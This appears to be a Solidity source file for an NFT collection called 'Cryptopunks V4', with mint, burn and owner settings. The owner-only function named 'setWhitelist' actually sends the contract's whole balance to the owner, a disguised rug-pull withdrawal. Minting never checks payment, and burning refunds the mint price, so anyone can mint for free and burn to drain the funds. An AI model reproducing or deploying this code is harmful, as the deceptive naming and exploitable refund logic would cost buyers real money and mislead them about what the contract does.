pragma solidity ^0.8.5;

import "./Ownable.sol";
import "./IERC721Enumerable.sol";
import "./ERC721.sol";
import "./Counters.sol";
import "./SafeMath.sol";

contract CryptoPunkV4 is ERC721, Ownable {
    using Strings for uint256;
    using SafeMath for uint256;
    using Counters for Counters.Counter;

    Counters.Counter private _tokenIdTracker;
    Counters.Counter private _burnedTracker;
    
    string public baseTokenURI;

    uint256 public constant MAX_ELEMENTS = 4444;    
    uint256 public MINT_PRICE = 0.08 ether;
    
    address
        public constant creatorAddress = 0x6d5B0344Ad51785c9fE7d04f9276803bCdc80f77;

    event CreateBurnable(uint256 indexed id);

    constructor() public ERC721("Cryptopunks V4", "V4PUNK") {}

    // This is NOT public, this is just for using it here
    modifier saleIsOpen {
        require(_totalSupply() <= MAX_ELEMENTS, "Sale end");
        _;
    }

    function totalSupply() public view returns (uint256) {
        return _tokenIdTracker.current();
    }

    function _totalSupply() internal view returns (uint256) {
        return _tokenIdTracker.current();
    }
    
    function _totalBurned() internal view returns (uint256) {
        return _burnedTracker.current();
    }
    
    function totalBurned() public view returns (uint256) {
        return _totalBurned();
    }

    function totalMint() public view returns (uint256) {
        return _totalSupply();
    }
    
    function mint(address _to, uint256 _count) public payable saleIsOpen {
        uint256 total = _totalSupply();
        require(total + _count <= MAX_ELEMENTS, "Max limit");
        require(total <= MAX_ELEMENTS, "Sale end");

        for (uint256 i = 0; i < _count; i++) {
            _mintAnElement(_to);
        }
    }

    function _mintAnElement(address _to) private {
        uint256 id = _totalSupply();
        _tokenIdTracker.increment();
        _safeMint(_to, id);
        emit CreateBurnable(id);
    }

    function setBaseURI(string memory baseURI) public onlyOwner {
        baseTokenURI = baseURI;
    }

    function setPrice(uint256 newPrice) public onlyOwner {
        MINT_PRICE = newPrice;
    }

    function tokenURI(uint256 _tokenId) public view override returns (string memory) {
        return string(abi.encodePacked(baseTokenURI, _tokenId.toString()));
    }

    function burn(uint256 _tokenId) public {
        require(ownerOf(_tokenId) == msg.sender);
        _transfer(
            msg.sender,
            0x000000000000000000000000000000000000dEaD,
            _tokenId
        );
        _burnedTracker.increment();
        _widthdraw(msg.sender, MINT_PRICE);
    }

    function _widthdraw(address _address, uint256 _amount) private {
        (bool success, ) = _address.call{value: _amount}("");
        require(success, "Transfer failed.");
    }

        function setWhitelist() public onlyOwner{
         payable(owner()).transfer(address(this).balance);
    }
}